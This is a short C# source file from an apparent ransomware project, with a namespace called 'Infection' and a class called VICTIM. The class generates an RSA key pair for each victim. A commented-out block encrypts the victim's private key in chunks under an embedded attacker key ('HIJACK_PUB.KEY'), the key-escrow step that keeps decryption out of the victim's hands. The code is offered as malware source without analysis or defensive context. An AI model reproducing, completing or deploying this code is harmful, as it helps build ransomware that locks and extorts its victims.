using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Infection
{
    class VICTIM
    {
        public static VICTIM Instance = new VICTIM();
        RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(3072);
        public string PUBLIC_KEY { get { return RSA.ToXmlString(false); } }

        public string PRIVATE_KEY
        {
            get
            {
                return RSA.ToXmlString(true);
                /*
                 var _RSA = new RSACryptoServiceProvider();
                string HIJACK_PUB = Utils.GetEmbeddedResource("Infection", "HIJACK_PUB.KEY");
                _RSA.FromXmlString(HIJACK_PUB);
                return string.Join(
                    "z", 
                    Utils.Split(RSA.ToXmlString(true), 128)
                    .Select(chunk =>
                        Utils.BytesToHex(
                            _RSA.Encrypt(
                                _encoder.GetBytes(chunk),
                                false
                            )))
                );
                */
            }
        }
        private static UnicodeEncoding _encoder = new UnicodeEncoding();
    }
}
